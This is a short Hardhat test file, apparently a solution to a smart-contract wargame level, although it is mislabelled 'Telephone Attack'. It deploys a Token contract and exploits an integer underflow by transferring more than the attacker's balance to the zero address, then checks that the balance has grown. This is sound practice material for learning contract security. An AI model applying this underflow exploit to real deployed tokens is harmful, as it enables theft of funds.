import { expect } from "chai";
import { ethers } from "hardhat";
import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
import { Token } from "../typechain";

describe("Telephone Attack", function () {
  let token: Token;
  let attacker: SignerWithAddress;
  const INITIAL_BALANCE = ethers.utils.parseEther("20");

  before(async () => {
    const signers = await ethers.getSigners();
    attacker = signers[0];

    const TokenFactory = await ethers.getContractFactory(
      "contracts/Token.sol:Token"
    );
    token = (await TokenFactory.deploy(INITIAL_BALANCE)) as Token;
  });

  it("INITIAL BALANCE of attacker before attack", async () => {
    expect(await token.balanceOf(attacker.address)).to.eq(INITIAL_BALANCE);
  });

  it("on attack", async function () {
    await token.transfer(ethers.constants.AddressZero, INITIAL_BALANCE.add(1));

    expect(await token.balanceOf(attacker.address)).to.gt(INITIAL_BALANCE);
  });
});
